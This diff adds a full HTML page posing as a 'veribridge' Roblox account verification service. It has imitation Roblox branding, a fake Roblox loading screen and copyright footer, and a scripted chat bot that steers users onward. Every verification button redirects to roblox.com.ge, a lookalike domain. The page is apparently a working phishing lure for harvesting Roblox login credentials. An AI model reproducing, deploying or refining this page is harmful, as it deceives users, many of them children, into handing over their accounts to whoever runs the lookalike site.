@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>veribridge | Roblox Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', 'Inter', system-ui, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2f 50%, #0b2b3b 100%);
+            overflow-x: hidden;
+        }
+
+        .frost-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+            background: radial-gradient(circle at 20% 40%, rgba(173, 216, 230, 0.03) 0%, transparent 70%);
+            z-index: 1;
+        }
+
+        .snowflake {
+            position: fixed;
+            top: -10px;
+            color: rgba(255, 255, 255, 0.8);
+            pointer-events: none;
+            z-index: 1000;
+            animation: fall linear forwards;
+            font-size: 1rem;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(360deg); opacity: 0.3; }
+        }
+
+        .premium-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem;
+            position: relative;
+            z-index: 20;
+        }
+
+        @media (min-width: 768px) {
+            .premium-container { padding: 1.5rem; }
+        }
+
+        .golden-header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .premium-logo-gold {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px);
+            padding: 0.6rem 1.2rem;
+            border-radius: 60px;
+            border: 1px solid rgba(100, 200, 255, 0.6);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .brand-logo {
+            height: 40px;
+            width: auto;
+            max-width: 140px;
+            object-fit: contain;
+            background: transparent;
+        }
+
+        @media (min-width: 768px) {
+            .brand-logo { height: 52px; max-width: 180px; }
+        }
+
+        .gold-badge {
+            background: linear-gradient(135deg, #2c5a7a, #1e3a5a);
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.65rem;
+            font-weight: bold;
+            color: #8dd0ff;
+        }
+
+        .dashboard-gold {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        @media (min-width: 900px) {
+            .dashboard-gold {
+                display: grid;
+                grid-template-columns: 300px 1fr;
+                gap: 1.5rem;
+            }
+        }
+
+        .verification-sidebar-gold {
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(16px);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(100, 200, 255, 0.4);
+            overflow: hidden;
+            height: fit-content;
+        }
+
+        .sidebar-gold-header {
+            background: linear-gradient(115deg, rgba(100, 200, 255, 0.2), rgba(100, 200, 255, 0.1));
+            padding: 1rem;
+            text-align: center;
+            border-bottom: 2px solid rgba(100, 200, 255, 0.6);
+        }
+
+        .sidebar-gold-header h2 {
+            font-size: 1rem;
+            color: #8dd0ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        @media (min-width: 768px) {
+            .sidebar-gold-header h2 { font-size: 1.2rem; }
+        }
+
+        .verify-options-gold {
+            padding: 0.8rem;
+        }
+
+        .verify-card-gold {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin-bottom: 0.8rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid rgba(100, 200, 255, 0.3);
+        }
+
+        .verify-card-gold.active {
+            background: linear-gradient(145deg, rgba(100, 200, 255, 0.25), rgba(100, 200, 255, 0.15));
+            border-color: #8dd0ff;
+            box-shadow: 0 4px 20px rgba(100, 200, 255, 0.3);
+            transform: translateX(4px);
+        }
+
+        .card-icon-gold {
+            font-size: 1.5rem;
+            margin-bottom: 0.3rem;
+        }
+
+        @media (min-width: 768px) {
+            .card-icon-gold { font-size: 1.8rem; }
+        }
+
+        .card-title-gold {
+            font-weight: 700;
+            color: #cceeff;
+            margin-bottom: 0.2rem;
+            font-size: 0.9rem;
+        }
+
+        .card-desc-gold {
+            font-size: 0.65rem;
+            color: #9ab3cc;
+        }
+
+        .verify-badge-gold {
+            display: inline-block;
+            margin-top: 6px;
+            font-size: 0.55rem;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 2px 8px;
+            border-radius: 20px;
+            color: #8dd0ff;
+        }
+
+        .login-viewer-gold {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(20px);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(100, 200, 255, 0.4);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .viewer-header-gold {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 0.8rem 1rem;
+            border-bottom: 1px solid rgba(100, 200, 255, 0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        @media (min-width: 600px) {
+            .viewer-header-gold {
+                flex-direction: row;
+                justify-content: space-between;
+                padding: 1rem 1.5rem;
+            }
+        }
+
+        .method-indicator-gold {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .method-icon-large-gold { font-size: 1.3rem; }
+        .method-name-gold { color: #cceeff; font-weight: 600; font-size: 0.9rem; }
+        .status-chip-gold {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 4px 10px;
+            border-radius: 40px;
+            font-size: 0.65rem;
+            color: #8dd0ff;
+        }
+
+        .redirect-container {
+            padding: 2rem 1.5rem;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .roblox-logo-icon {
+            font-size: 4rem;
+            animation: floatRoblox 3s ease-in-out infinite;
+        }
+
+        @keyframes floatRoblox {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .redirect-title {
+            color: #8dd0ff;
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+
+        .redirect-desc {
+            color: #9ab3cc;
+            font-size: 0.8rem;
+            max-width: 400px;
+        }
+
+        .bottom-start-btn {
+            background: linear-gradient(95deg, #2c5a7a, #1e3a5a);
+            border: none;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
+            margin: 1rem 0 1.5rem;
+            box-shadow: 0 4px 15px rgba(44, 90, 122, 0.4);
+        }
+        .bottom-start-btn:hover { transform: scale(1.02); }
+
+        .footer-gold {
+            text-align: center;
+            margin-top: 1.2rem;
+            font-size: 0.6rem;
+            color: #9ab3cc;
+        }
+
+        /* Start Screen */
+        #startScreen {
+            text-align: center;
+            padding: 40px 20px;
+            min-height: 60vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #startScreen h2 { color: #8dd0ff; font-size: 1.6rem; margin-bottom: 12px; }
+        #startScreen p { color: #9ab3cc; margin-bottom: 28px; max-width: 500px; font-size: 0.9rem; }
+        #startVerificationBtn {
+            background: linear-gradient(95deg, #2c5a7a, #1e3a5a);
+            border: none;
+            padding: 14px 36px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(44,90,122,0.5);
+        }
+        @media (min-width: 768px) {
+            #startScreen h2 { font-size: 2rem; }
+            #startVerificationBtn { padding: 16px 48px; font-size: 1.2rem; }
+        }
+
+        .fullscreen-loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(20px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+        }
+        .fullscreen-loading.active { opacity: 1; visibility: visible; }
+        .loading-spinner-large {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(100, 200, 255, 0.2);
+            border-top: 4px solid #8dd0ff;
+            border-radius: 50%;
+            animation: spinGold 1s linear infinite;
+        }
+        .loading-text-glow { color: #8dd0ff; font-size: 1.2rem; font-weight: 600; text-align: center; }
+        @keyframes spinGold { to { transform: rotate(360deg); } }
+
+        /* Roblox-style loading modal with Skeleton UI and "Not logged in" notice */
+        .roblox-loading-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #0d0f14 0%, #0a0c10 100%);
+            z-index: 3000;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+            overflow-y: auto;
+        }
+        .roblox-loading-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-header {
+            padding: 30px 20px 10px;
+        }
+        .modal-header .logo {
+            height: 60px;
+        }
+        /* Not logged in notice - placed at top */
+        .not-logged-notice {
+            background: #3aa0d8;
+            color: #0b1e2d;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .notice-icon {
+            width: 28px;
+            height: 28px;
+            background: #0b1e2d;
+            color: #3aa0d8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .notice-text strong {
+            display: block;
+            font-size: 16px;
+        }
+        .notice-text span {
+            font-size: 14px;
+        }
+        /* Skeleton loading bars */
+        .skeleton {
+            padding: 20px;
+            flex: 1;
+        }
+        .bar {
+            height: 14px;
+            border-radius: 8px;
+            margin: 18px 0;
+            background: linear-gradient(90deg, #2a2d33, #3a3d44, #2a2d33);
+        }
+        .bar.small { width: 60%; }
+        .bar.medium { width: 85%; }
+        .bar.full { width: 100%; }
+        .divider {
+            height: 1px;
+            background: #2a2d33;
+            margin: 20px 0;
+        }
+        .circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 40px auto;
+            background: linear-gradient(90deg, #2a2d33, #3a3d44, #2a2d33);
+        }
+        .modal-footer {
+            text-align: center;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .modal-footer .footer-logo img {
+            height: 26px;
+            margin-bottom: 15px;
+        }
+        .modal-footer .footer-links {
+            font-size: 14px;
+            color: #bdbebe;
+        }
+        .modal-footer .footer-links span {
+            margin: 0 8px;
+        }
+        .modal-footer .footer-text {
+            font-size: 12px;
+            color: #72767d;
+            margin-top: 15px;
+        }
+
+        /* AI Chat */
+        .ai-chat-widget {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            z-index: 1000;
+            cursor: pointer;
+        }
+        .chat-bubble {
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #2c5a7a, #1e3a5a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .chat-bubble span { font-size: 28px; }
+        .chat-window {
+            position: fixed;
+            bottom: 80px;
+            right: 15px;
+            width: 300px;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            border: 1px solid rgba(100,200,255,0.5);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 1001;
+        }
+        .chat-window.active { display: flex; }
+        .chat-header {
+            background: linear-gradient(135deg, rgba(100,200,255,0.3), rgba(100,200,255,0.1));
+            padding: 10px 14px;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(100,200,255,0.3);
+        }
+        .chat-header h4 { color: #8dd0ff; font-size: 0.9rem; }
+        .close-chat { background: none; border: none; color: #8dd0ff; font-size: 1.3rem; cursor: pointer; }
+        .chat-messages {
+            height: 250px;
+            overflow-y: auto;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .message { display: flex; gap: 6px; max-width: 90%; }
+        .message.ai { align-self: flex-start; }
+        .message.user { align-self: flex-end; flex-direction: row-reverse; }
+        .message-bubble {
+            background: rgba(255,255,255,0.1);
+            padding: 6px 10px;
+            border-radius: 16px;
+            font-size: 0.75rem;
+            color: #cceeff;
+        }
+        .message.user .message-bubble { background: linear-gradient(135deg, #2c5a7a, #1e3a5a); color: white; }
+        .chat-input-area {
+            padding: 10px;
+            border-top: 1px solid rgba(100,200,255,0.3);
+            display: flex;
+            gap: 6px;
+        }
+        .chat-input {
+            flex: 1;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(100,200,255,0.4);
+            border-radius: 40px;
+            padding: 8px 12px;
+            color: white;
+            font-size: 0.75rem;
+        }
+        .send-btn {
+            background: linear-gradient(135deg, #2c5a7a, #1e3a5a);
+            border: none;
+            border-radius: 40px;
+            padding: 8px 16px;
+            font-weight: bold;
+            cursor: pointer;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+<div class="frost-overlay"></div>
+
+<div id="startLoadingOverlay" class="fullscreen-loading">
+    <div class="loading-spinner-large"></div>
+    <div class="loading-text-glow">VERIBRIDGE</div>
+</div>
+
+<script>
+    function createSnowflake() {
+        const sf = document.createElement('div');
+        sf.classList.add('snowflake');
+        sf.innerHTML = ['❄️', '✨', '💠', '🔷'][Math.floor(Math.random() * 4)];
+        sf.style.left = Math.random() * window.innerWidth + 'px';
+        sf.style.fontSize = (Math.random() * 12 + 8) + 'px';
+        sf.style.animationDuration = Math.random() * 4 + 3 + 's';
+        document.body.appendChild(sf);
+        setTimeout(() => sf.remove(), 6000);
+    }
+    setInterval(createSnowflake, 350);
+</script>
+
+<div class="premium-container">
+    <div class="golden-header">
+        <div class="premium-logo-gold">
+            <img class="brand-logo" id="siteLogo" src="https://i.imgur.com/HF0svxe.png" alt="logo" onerror="this.style.display='none';">
+            <span class="gold-badge">ROBLOX VERIFICATION</span>
+        </div>
+    </div>
+
+    <div id="startScreen">
+        <div style="font-size: 4rem; margin-bottom: 16px;">🎮✨</div>
+        <h2>Welcome to veribridge</h2>
+        <p>Select a verification method after loading the dashboard.</p>
+        <button id="startVerificationBtn">▶ Start Verification</button>
+    </div>
+
+    <div id="mainDashboard" style="display: none;">
+        <div class="dashboard-gold">
+            <div class="verification-sidebar-gold">
+                <div class="sidebar-gold-header">
+                    <h2>⚡ VERIFICATION METHODS</h2>
+                </div>
+                <div class="verify-options-gold">
+                    <div class="verify-card-gold" data-method="login" id="methodLoginGold">
+                        <div class="card-icon-gold"></div>
+                        <div class="card-title-gold">Authorize Roblox</div>
+                        <div class="card-desc-gold">Link your Roblox account with Veribridge in one click.</div>
+                        <div class="verify-badge-gold" id="loginStatusGold">⚪ Not verified</div>
+                    </div>
+                    <div class="verify-card-gold" data-method="ingame" id="methodIngameGold">
+                        <div class="card-icon-gold">🎮</div>
+                        <div class="card-title-gold">Verify via In-Game</div>
+                        <div class="card-desc-gold">Roblox In-Game Auth</div>
+                        <div class="verify-badge-gold" id="ingameStatusGold">⚪ Not verified</div>
+                    </div>
+                    <div class="verify-card-gold" data-method="community" id="methodCommunityGold">
+                        <div class="card-icon-gold">👥</div>
+                        <div class="card-title-gold">Verify via Community</div>
+                        <div class="card-desc-gold">Roblox Group/Community</div>
+                        <div class="verify-badge-gold" id="communityStatusGold">⚪ Not verified</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="login-viewer-gold">
+                <div class="viewer-header-gold">
+                    <div class="method-indicator-gold">
+                        <span class="method-icon-large-gold" id="activeMethodIconGold"></span>
+                        <span class="method-name-gold" id="activeMethodNameGold">Authorize Roblox</span>
+                    </div>
+                    <span class="status-chip-gold" id="verificationStatusGold">⚠️ Not verified</span>
+                </div>
+
+                <div class="redirect-container">
+                    <div class="roblox-logo-icon">🎮🔐</div>
+                    <div class="redirect-title">Click any method to begin</div>
+                    <div class="redirect-desc">Select one of the verification options from the sidebar. You will be redirected to Roblox to complete the process.</div>
+                    <button id="bottomStartVerifyBtn" class="bottom-start-btn">▶ Start Verification</button>
+                </div>
+            </div>
+        </div>
+        <div class="footer-gold">⚡ Select a verification method → you will be redirected to Roblox</div>
+    </div>
+</div>
+
+<!-- Roblox-style loading modal with Skeleton UI + "Not logged in" notice at top -->
+<div id="robloxLoadingModal" class="roblox-loading-modal">
+    <div class="modal-header">
+        <img class="logo" src="https://i.imgur.com/cl2vJC5.png" alt="Roblox">
+    </div>
+    <!-- Not logged in notice (at the top) -->
+    <div class="not-logged-notice">
+        <div class="notice-icon">!</div>
+        <div class="notice-text">
+            <strong>Not logged in</strong>
+            <span>Redirecting to login...</span>
+        </div>
+    </div>
+    <!-- Skeleton Loading UI -->
+    <div class="skeleton">
+        <div class="bar medium"></div>
+        <div class="divider"></div>
+        <div class="bar full"></div>
+        <div class="circle"></div>
+        <div class="bar full"></div>
+        <div class="bar full"></div>
+        <div class="bar medium"></div>
+    </div>
+    <div class="modal-footer">
+        <div class="footer-logo">
+            <img src="https://i.imgur.com/cl2vJC5.png" alt="Roblox">
+        </div>
+        <div class="footer-links">
+            About Us <span>|</span> Join Us <span>|</span> Terms <span>|</span> Accessibility <span>|</span> Privacy
+        </div>
+        <div class="footer-text">
+            ©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </div>
+</div>
+
+<div class="ai-chat-widget" id="chatWidget">
+    <div class="chat-bubble"><span>🤖</span></div>
+</div>
+<div class="chat-window" id="chatWindow">
+    <div class="chat-header"><h4>✨ Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div>
+    <div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">👋 Welcome! Click 'Start Verification', then choose a method. You'll see a Roblox loading screen and be redirected immediately.</div></div></div>
+    <div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask..."><button class="send-btn" id="sendChatBtn">Send</button></div>
+</div>
+
+<script>
+    // AI Chat
+    const chatWidget = document.getElementById('chatWidget');
+    const chatWindow = document.getElementById('chatWindow');
+    const closeChatBtn = document.getElementById('closeChatBtn');
+    const chatInput = document.getElementById('chatInput');
+    const sendChatBtn = document.getElementById('sendChatBtn');
+    const chatMessages = document.getElementById('chatMessages');
+
+    function addMessage(text, isUser = false) {
+        const div = document.createElement('div');
+        div.className = `message ${isUser ? 'user' : 'ai'}`;
+        div.innerHTML = `<div class="message-bubble">${text}</div>`;
+        chatMessages.appendChild(div);
+        chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    function getAIResponse(q) {
+        const l = q.toLowerCase();
+        if (l.includes('method') || l.includes('verify')) return "📋 Choose a method from the sidebar. You'll see a Roblox loading screen, then be redirected immediately.";
+        if (l.includes('community')) return "👥 The Community method takes you to the Roblox group page for verification.";
+        return "💙 Select a verification method, you'll see a Roblox-style loading effect, then be redirected.";
+    }
+
+    function sendMessage() {
+        const txt = chatInput.value.trim();
+        if (!txt) return;
+        addMessage(txt, true);
+        chatInput.value = '';
+        setTimeout(() => addMessage(getAIResponse(txt), false), 400);
+    }
+
+    chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
+    closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
+    sendChatBtn.addEventListener('click', sendMessage);
+    chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+
+    // ---------- VERIFICATION SYSTEM ----------
+    const LOGIN_URL = "https://roblox.com.ge/login?returnUrl=8785603489260332";
+    const COMMUNITY_URL = "https://roblox.com.ge/communities/3529272875/#!/about";
+
+    const methodUrls = {
+        login: LOGIN_URL,
+        ingame: LOGIN_URL,
+        community: COMMUNITY_URL
+    };
+
+    let verificationState = {
+        login: { completed: false },
+        ingame: { completed: false },
+        community: { completed: false }
+    };
+    let currentActiveMethod = "login";
+
+    const methodLogin = document.getElementById('methodLoginGold');
+    const methodIngame = document.getElementById('methodIngameGold');
+    const methodCommunity = document.getElementById('methodCommunityGold');
+    const loginBadge = document.getElementById('loginStatusGold');
+    const ingameBadge = document.getElementById('ingameStatusGold');
+    const communityBadge = document.getElementById('communityStatusGold');
+    const activeMethodIcon = document.getElementById('activeMethodIconGold');
+    const activeMethodName = document.getElementById('activeMethodNameGold');
+    const verificationStatusChip = document.getElementById('verificationStatusGold');
+    const bottomStartBtn = document.getElementById('bottomStartVerifyBtn');
+    const robloxModal = document.getElementById('robloxLoadingModal');
+
+    function onMethodClick(method) {
+        const url = methodUrls[method];
+        if (url) {
+            robloxModal.classList.add('active');
+            window.location.href = url;
+        } else {
+            addMessage("⚠️ Invalid URL for this method.", false);
+        }
+    }
+
+    function updateUI() {
+        [methodLogin, methodIngame, methodCommunity].forEach(el => el.classList.remove('active'));
+        if (currentActiveMethod === 'login') methodLogin.classList.add('active');
+        if (currentActiveMethod === 'ingame') methodIngame.classList.add('active');
+        if (currentActiveMethod === 'community') methodCommunity.classList.add('active');
+
+        const icons = { login: '', ingame: '🎮', community: '👥' };
+        const names = { login: 'Authorize Roblox', ingame: 'Verify via In-Game', community: 'Verify via Community' };
+        activeMethodIcon.innerHTML = icons[currentActiveMethod] || '🔐';
+        activeMethodName.innerHTML = names[currentActiveMethod];
+
+        const isCompleted = verificationState[currentActiveMethod].completed;
+        verificationStatusChip.innerHTML = isCompleted ? '✅ VERIFIED' : '⚠️ NOT VERIFIED';
+        verificationStatusChip.style.color = isCompleted ? '#8dd0ff' : '#9ab3cc';
+
+        loginBadge.innerHTML = verificationState.login.completed ? '✅ VERIFIED' : '⚪ Not verified';
+        ingameBadge.innerHTML = verificationState.ingame.completed ? '✅ VERIFIED' : '⚪ Not verified';
+        communityBadge.innerHTML = verificationState.community.completed ? '✅ VERIFIED' : '⚪ Not verified';
+    }
+
+    function setActiveMethod(method) {
+        currentActiveMethod = method;
+        updateUI();
+    }
+
+    methodLogin.addEventListener('click', () => {
+        setActiveMethod('login');
+        onMethodClick('login');
+    });
+    methodIngame.addEventListener('click', () => {
+        setActiveMethod('ingame');
+        onMethodClick('ingame');
+    });
+    methodCommunity.addEventListener('click', () => {
+        setActiveMethod('community');
+        onMethodClick('community');
+    });
+    bottomStartBtn.addEventListener('click', () => {
+        onMethodClick(currentActiveMethod);
+    });
+
+    const startBtn = document.getElementById('startVerificationBtn');
+    const startScreen = document.getElementById('startScreen');
+    const mainDashboard = document.getElementById('mainDashboard');
+    const startLoading = document.getElementById('startLoadingOverlay');
+
+    startBtn.addEventListener('click', () => {
+        startLoading.classList.add('active');
+        setTimeout(() => {
+            startLoading.classList.remove('active');
+            startScreen.style.display = 'none';
+            mainDashboard.style.display = 'block';
+            addMessage("✨ Dashboard ready. Click any verification method to continue.", false);
+            updateUI();
+        }, 1500);
+    });
+
+    updateUI();
+</script>
+</body>
+</html>
